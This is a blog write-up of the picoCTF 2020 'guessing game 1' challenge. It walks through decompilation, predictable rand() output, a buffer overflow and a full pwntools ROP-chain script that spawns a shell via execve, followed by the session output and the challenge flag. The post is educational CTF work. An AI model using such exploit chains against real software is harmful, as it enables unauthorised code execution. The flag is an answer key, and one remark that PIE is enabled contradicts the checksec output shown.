<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>picoCTF 2020 - pwn: guessing game 1 | All Things Cyber – joonkim0625</title>
<meta name="keywords" content="CTF, picoCTF 2020, cybersecurity, binary exploit, IDA, Python, Script">
<meta name="description" content="References
1: https://mregraoncyber.com/picoctf-writeup-guessing-game-1/
2: https://github.com/dannyc-dev/Building-the-ROP-Chain
3: https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9
Investigation
file ./vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
This tells us that this executable contains all the libraries so we will be able
to find a lot of gadgets if we have to find some.
Checksec result
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
PIE is disabled and NX is enabled so we won&rsquo;t be able to execute anything by putting things onto the
stack. We will need to do some ROP.">
<meta name="author" content="Joon Kim">
<link rel="canonical" href="https://joonkim0625.github.io/posts/2022-12-27-guessing-game-1/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2022-12-27-guessing-game-1/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2022-12-27-guessing-game-1/">
  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
  <meta property="og:title" content="picoCTF 2020 - pwn: guessing game 1">
  <meta property="og:description" content="References 1: https://mregraoncyber.com/picoctf-writeup-guessing-game-1/
2: https://github.com/dannyc-dev/Building-the-ROP-Chain
3: https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9
Investigation file ./vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped This tells us that this executable contains all the libraries so we will be able to find a lot of gadgets if we have to find some.
Checksec result Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) PIE is disabled and NX is enabled so we won’t be able to execute anything by putting things onto the stack. We will need to do some ROP.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-12-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2022-12-27T00:00:00+00:00">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="PicoCTF 2020">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Binary Exploit">
    <meta property="article:tag" content="IDA">
    <meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="picoCTF 2020 - pwn: guessing game 1">
<meta name="twitter:description" content="References
1: https://mregraoncyber.com/picoctf-writeup-guessing-game-1/
2: https://github.com/dannyc-dev/Building-the-ROP-Chain
3: https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9
Investigation
file ./vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
This tells us that this executable contains all the libraries so we will be able
to find a lot of gadgets if we have to find some.
Checksec result
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
PIE is disabled and NX is enabled so we won&rsquo;t be able to execute anything by putting things onto the
stack. We will need to do some ROP.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://joonkim0625.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "picoCTF 2020 - pwn: guessing game 1",
      "item": "https://joonkim0625.github.io/posts/2022-12-27-guessing-game-1/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "picoCTF 2020 - pwn: guessing game 1",
  "name": "picoCTF 2020 - pwn: guessing game 1",
  "description": "References 1: https://mregraoncyber.com/picoctf-writeup-guessing-game-1/\n2: https://github.com/dannyc-dev/Building-the-ROP-Chain\n3: https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9\nInvestigation file ./vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped This tells us that this executable contains all the libraries so we will be able to find a lot of gadgets if we have to find some.\nChecksec result Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) PIE is disabled and NX is enabled so we won\u0026rsquo;t be able to execute anything by putting things onto the stack. We will need to do some ROP.\n",
  "keywords": [
    "CTF", "picoCTF 2020", "cybersecurity", "binary exploit", "IDA", "Python", "Script"
  ],
  "articleBody": "References 1: https://mregraoncyber.com/picoctf-writeup-guessing-game-1/\n2: https://github.com/dannyc-dev/Building-the-ROP-Chain\n3: https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9\nInvestigation file ./vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped This tells us that this executable contains all the libraries so we will be able to find a lot of gadgets if we have to find some.\nChecksec result Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) PIE is disabled and NX is enabled so we won’t be able to execute anything by putting things onto the stack. We will need to do some ROP.\nDecompliation Main function unsigned int v3; // [rsp+1Ch] [rbp-4h] setvbuf(stdout, 0LL, 2LL, 0LL); v3 = getegid(); setresgid(v3, v3, v3); puts(\"Welcome to my guessing game!\\n\"); while ( 1 ) { while ( !(unsigned int)do_stuff() ) ; win(); } The do_stuff() seems to be the main logic of this program.\ndo_stuff() __int64 random; // rax char v2[104]; // [rsp+0h] [rbp-80h] BYREF __int64 v3; // [rsp+68h] [rbp-18h] __int64 v4; // [rsp+70h] [rbp-10h] unsigned int v5; // [rsp+7Ch] [rbp-4h] random = get_random(); v4 = increment(random); v5 = 0; puts(\"What number would you like to guess?\"); fgets(v2, 100LL, stdin); v3 = atol(v2); if ( v3 ) { if ( v3 == v4 ) { puts(\"Congrats! You win! Your prize is this print statement!\\n\"); return 1; } else { puts(\"Nope!\\n\"); } } else { puts(\"That's not a valid number!\"); } return v5; win() nt64 __fastcall win(__int64 a1, int a2, int a3, int a4, int a5, int a6) { int v6; // edx int v7; // ecx int v8; // r8d int v9; // r9d char v11[112]; // [rsp+0h] [rbp-70h] BYREF printf((unsigned int)\"New winner!\\nName? \", a2, a3, a4, a5, a6, v11[0]); fgets(v11, 360LL, stdin); return printf((unsigned int)\"Congrats %s\\n\\n\", (unsigned int)v11, v6, v7, v8, v9, v11[0]); } get_random() does one job rand() % 100. rand() from the standard library returns a pseudo-random number (between 0 and 32767 which is the RAND_MAX value). From the reference [1], I learned that rand() generates numbers can be guessed because they are generated by having a pattern. This means that every time we run this program, it will generate the same number and we will be able to guess that number by creating a small program.\nOnce we give the program the correct guess, it will execute win() asking for the name of user. As we can see from the decompiled code, win() has a buffer that we can use to store our rop chain.\nUsing gdb-gef to find an offset to the buffer that stores the name of the user, it was 120 bytes.\nCollecting gadgets Our goal is likely to use execve() to run a shell /bin/sh. execve() needs three arguments to it: the file path to execute, argv, and envp. And the second and the third arguments can be null. I used to use rp++ to find gadgets, but ROPgadget provides useful steps to create a rop chain (rp++ might have something like this too but I have not done my research). By simply running ROPgadget --binary ./vuln --ropchain, you will get something like this:\nROP chain generation =========================================================== - Step 1 -- Write-what-where gadgets [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret [+] Gadget found: 0x410ca3 pop rsi ; ret [+] Gadget found: 0x4163f4 pop rax ; ret [+] Gadget found: 0x445950 xor rax, rax ; ret - Step 2 -- Init syscall number gadgets [+] Gadget found: 0x445950 xor rax, rax ; ret [+] Gadget found: 0x475430 add rax, 1 ; ret [+] Gadget found: 0x475431 add eax, 1 ; ret - Step 3 -- Init syscall arguments gadgets [+] Gadget found: 0x400696 pop rdi ; ret [+] Gadget found: 0x410ca3 pop rsi ; ret [+] Gadget found: 0x44a6b5 pop rdx ; ret - Step 4 -- Syscall gadget [+] Gadget found: 0x40137c syscall Very convenient!\nto move something into rdi register (first arg to a function)\n0x00400696: pop rdi ; ret; to move something into rsi register (second arg to a function)\n0x410ca3 pop rsi ; ret; to move something into rdx register (third arg to a function)\n0x44a6b5 pop rdx ; ret; to move something into rax register (also where the syscall number goes into)\n0x4163f4 pop rax ; ret; to move something into where rsi register points to\n0x47ff91 mov qword ptr [rsi], rax ; ret to clear rax register\n0x445950 xor rax, rax ; ret; to call syscall\n0x0040137c: syscall; /bin/sh in the little endian format\n0x68732f6e69622f Use of .bss section\nFrom some research, since the executable’s PIE is enabled, we can utilize some memory segment that have READ/WRITE permissions such as .bss section. This can be checked by running the executable under GDB and checking its vmmap to see the start and the end of some memory region that have such permissions. Also, we can do readelf -S vuln to see all the section headers within the executable.\nThe address of WA segment of the memory .bss: 0x00000000006bc3a0 this is where we are going to store /bin/sh Now, we need to chain all these gadgets. Since we won’t be able to store the string onto the stack, we need to write /bin/sh into .bss section. How we are going to do is to bring the address of .bss section into rsi register since it is the file path argument for execve(). Then, we will have one of the registers hold /bin/sh string. After that, we will use this instruction 0x47ff91 mov qword ptr [rsi], rax ; ret; to assign the string value to the memory address that rsi register has. This will make sure that the address of .bss points to the start of /bin/sh (we will later bring this address into rdi).\nIt is important to realize what gadgets we are allowed to use and use them wisely to craft the chain. In this case, we have a gadget allows us to move something from rax into the memory address pointed by rsi and we have gadgets that do pop rsi, mov rax, and pop rax. So it makes sense that move the address of .bss segment into rsi, put the string value into rax by popping rax, move that rax’s value into the memory address stored in rsi, then finally move .bss address into rdi by popping rdi register (I am reiterating a lot but this is needed to make sure I understand what is going on).\nI came up with this python script:\n#!/usr/bin/env python3 from pwn import * exe = ELF(\"./vuln\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.DEBUG: gdb.attach(r) else: r = remote(\"jupiter.challenges.picoctf.org\", 26735) return r def main(): r = conn() # good luck pwning :) bss_addr = p64(0x6bc3a0) syscall = p64(0x40137c) bin_sh = p64(0x68732f6e69622f) # /bin/sh in little endian pop_rdi = p64(0x400696) pop_rsi = p64(0x410ca3) pop_rdx = p64(0x44a6b5) pop_rax = p64(0x4163f4) mov_str_to_bss = p64(0x47ff91) execve_num = p64(0x3b) clear_rax = p64(0x445950) # we know that the offset to the ret address within the win() is 120 bytes payload = 120 * b'A' # we want 'rsi' register to have the address to .bss seg payload += pop_rsi payload += bss_addr # we put /bin/sh string into a temp register (in our case, rax) # then we move that str value to be pointed by rsi's mem address of .bss seg payload += pop_rax payload += bin_sh payload += mov_str_to_bss # clear rax by xor'ing then mov 59 or hex 0x3b into rax for execve() syscall payload += clear_rax # might not be necessary payload += pop_rax payload += execve_num # bring .bss address which points to the start of /bin/sh into rdi for execve() payload += pop_rdi payload += bss_addr # clear rsi and rdx (null) payload += pop_rsi payload += p64(0) payload += pop_rdx payload += p64(0) # syscall! payload += syscall # beginning of the program # 84 is the first sequence of the randomly generated numbers: rand() % 100 + 1 r.sendline(b'84') r.sendline(payload) r.interactive() if __name__ == \"__main__\": main() The result:\n$ python3 solve.py 1 ⚙ [*] '/home/kali/ctf/picoctf2020/guessing-game-1/vuln' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to jupiter.challenges.picoctf.org on port 26735: Done b'first: /bin/sh\\x00' b'second: hs/nib/' [*] Switching to interactive mode Welcome to my guessing game! What number would you like to guess? Congrats! You win! Your prize is this print statement! New winner! Name? Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa3\\x0c $ cat flag.txt picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b751b438dd8c4bb7}$ Nice! Thank you for reading.\n",
  "wordCount" : "1408",
  "inLanguage": "en",
  "datePublished": "2022-12-27T00:00:00Z",
  "dateModified": "2022-12-27T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Joon Kim"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://joonkim0625.github.io/posts/2022-12-27-guessing-game-1/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "All Things Cyber – joonkim0625",
    "logo": {
      "@type": "ImageObject",
      "url": "https://joonkim0625.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      picoCTF 2020 - pwn: guessing game 1
    </h1>
    <div class="post-meta"><span title='2022-12-27 00:00:00 +0000 UTC'>December 27, 2022</span>&nbsp;·&nbsp;Joon Kim

</div>
  </header> 
  <div class="post-content"><h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<p>1: <a href="https://mregraoncyber.com/picoctf-writeup-guessing-game-1/">https://mregraoncyber.com/picoctf-writeup-guessing-game-1/</a></p>
<p>2: <a href="https://github.com/dannyc-dev/Building-the-ROP-Chain">https://github.com/dannyc-dev/Building-the-ROP-Chain</a></p>
<p>3: <a href="https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9">https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9</a></p>
<h2 id="investigation">Investigation<a hidden class="anchor" aria-hidden="true" href="#investigation">#</a></h2>
<h3 id="file-vuln">file ./vuln<a hidden class="anchor" aria-hidden="true" href="#file-vuln">#</a></h3>
<pre tabindex="0"><code>vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
</code></pre><p>This tells us that this executable contains all the libraries so we will be able
to find a lot of gadgets if we have to find some.</p>
<h3 id="checksec-result">Checksec result<a hidden class="anchor" aria-hidden="true" href="#checksec-result">#</a></h3>
<pre tabindex="0"><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre><p>PIE is disabled and NX is enabled so we won&rsquo;t be able to execute anything by putting things onto the
stack. We will need to do some ROP.</p>
<h3 id="decompliation">Decompliation<a hidden class="anchor" aria-hidden="true" href="#decompliation">#</a></h3>
<h4 id="main-function">Main function<a hidden class="anchor" aria-hidden="true" href="#main-function">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2LL</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setresgid</span>(v3, v3, v3);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Welcome to my guessing game!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">do_stuff</span>() )
</span></span><span style="display:flex;"><span>    ;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">win</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>do_stuff()</code> seems to be the main logic of this program.</p>
<h4 id="do_stuff">do_stuff()<a hidden class="anchor" aria-hidden="true" href="#do_stuff">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> random; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v2[<span style="color:#ae81ff">104</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-80h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+68h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+70h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+7Ch] [rbp-4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  random <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_random</span>();
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">increment</span>(random);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;What number would you like to guess?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(v2, <span style="color:#ae81ff">100LL</span>, stdin);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atol</span>(v2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v3 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> v4 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Congrats! You win! Your prize is this print statement!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Nope!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;That&#39;s not a valid number!&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v5;
</span></span></code></pre></div><h4 id="win">win()<a hidden class="anchor" aria-hidden="true" href="#win">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nt64 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2, <span style="color:#66d9ef">int</span> a3, <span style="color:#66d9ef">int</span> a4, <span style="color:#66d9ef">int</span> a5, <span style="color:#66d9ef">int</span> a6)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// ecx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v9; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v11[<span style="color:#ae81ff">112</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-70h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;New winner!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Name? &#34;</span>, a2, a3, a4, a5, a6, v11[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(v11, <span style="color:#ae81ff">360LL</span>, stdin);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;Congrats %s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v11, v6, v7, v8, v9, v11[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>get_random()</code> does one job <code>rand() % 100</code>. <code>rand()</code> from the standard library
returns a pseudo-random number (between 0 and 32767 which is the <code>RAND_MAX</code> value).
From the reference [1], I learned that <code>rand()</code> generates numbers can be guessed
because they are generated by having a pattern. This means that every time we run
this program, it will generate the same number and we will be able to guess that
number by creating a small program.</p>
<p>Once we give the program the correct guess, it will execute <code>win()</code> asking for
the name of user. As we can see from the decompiled code, <code>win()</code> has a buffer
that we can use to store our rop chain.</p>
<p>Using gdb-gef to find an offset to the buffer that stores the name of the user,
it was 120 bytes.</p>
<h3 id="collecting-gadgets">Collecting gadgets<a hidden class="anchor" aria-hidden="true" href="#collecting-gadgets">#</a></h3>
<p>Our goal is likely to use <code>execve()</code> to run a shell <code>/bin/sh</code>. <code>execve()</code> needs
three arguments to it: the file path to execute, argv, and envp. And the second
and the third arguments can be null. I used to use <code>rp++</code> to find gadgets, but
<code>ROPgadget</code> provides useful steps to create a rop chain (<code>rp++</code> might have
something like this too but I have not done my research). By simply running
<code>ROPgadget --binary ./vuln --ropchain</code>, you will get something like this:</p>
<pre tabindex="0"><code>ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
        [+] Gadget found: 0x410ca3 pop rsi ; ret
        [+] Gadget found: 0x4163f4 pop rax ; ret
        [+] Gadget found: 0x445950 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x445950 xor rax, rax ; ret
        [+] Gadget found: 0x475430 add rax, 1 ; ret
        [+] Gadget found: 0x475431 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x400696 pop rdi ; ret
        [+] Gadget found: 0x410ca3 pop rsi ; ret
        [+] Gadget found: 0x44a6b5 pop rdx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x40137c syscall
</code></pre><p>Very convenient!</p>
<ul>
<li>
<p>to move something into <code>rdi</code> register (first arg to a function)</p>
<ul>
<li>0x00400696: pop rdi ; ret;</li>
</ul>
</li>
<li>
<p>to move something into <code>rsi</code> register (second arg to a function)</p>
<ul>
<li>0x410ca3 pop rsi ; ret;</li>
</ul>
</li>
<li>
<p>to move something into <code>rdx</code> register (third arg to a function)</p>
<ul>
<li>0x44a6b5 pop rdx ; ret;</li>
</ul>
</li>
<li>
<p>to move something into <code>rax</code> register (also where the syscall number goes into)</p>
<ul>
<li>0x4163f4 pop rax ; ret;</li>
</ul>
</li>
<li>
<p>to move something into where <code>rsi</code> register points to</p>
<ul>
<li>0x47ff91 mov qword ptr [rsi], rax ; ret</li>
</ul>
</li>
<li>
<p>to clear <code>rax</code> register</p>
<ul>
<li>0x445950 xor rax, rax ; ret;</li>
</ul>
</li>
<li>
<p>to call <code>syscall</code></p>
<ul>
<li>0x0040137c: syscall;</li>
</ul>
</li>
<li>
<p><code>/bin/sh</code> in the little endian format</p>
<ul>
<li><code>0x68732f6e69622f</code></li>
</ul>
</li>
</ul>
<p><strong>Use of <code>.bss</code> section</strong></p>
<p>From some research, since the executable&rsquo;s PIE is enabled, we can utilize some
memory segment that have READ/WRITE permissions such as <code>.bss</code> section. This can
be checked by running the executable under GDB and checking its <code>vmmap</code> to see
the start and the end of some memory region that have such permissions. Also, we
can do <code>readelf -S vuln</code> to see all the section headers within the executable.</p>
<ul>
<li>The address of WA segment of the memory
<ul>
<li><code>.bss</code>: 0x00000000006bc3a0</li>
<li>this is where we are going to store <code>/bin/sh</code></li>
</ul>
</li>
